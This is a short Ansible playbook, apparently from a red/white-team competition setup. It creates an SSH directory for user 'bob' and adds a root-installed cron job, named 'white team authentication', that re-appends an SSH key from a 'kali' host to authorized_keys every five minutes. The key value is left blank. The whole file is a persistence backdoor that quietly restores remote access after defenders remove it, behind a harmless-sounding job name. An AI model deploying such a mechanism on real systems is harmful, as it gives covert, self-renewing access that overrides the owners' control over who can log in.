---
- name: "set up cron ssh"
  hosts: all
  become: yes
  tasks:
    - name: "set up .ssh directory"
      shell: "mkdir -p /home/bob/.ssh; touch /home/bob/.ssh/authorized_keys; chmod 644 /home/bob/.ssh/authorized_keys; chown -R bob:bob /home/bob/.ssh"
    - name: "cron job to add ssh keys"
      cron:
        name: "white team authentication"
        user: "bob"
        minute: "*/5"
        job: "echo 'ssh-rsa  bob@kali' >> /home/bob/.ssh/authorized_keys"
        state: present
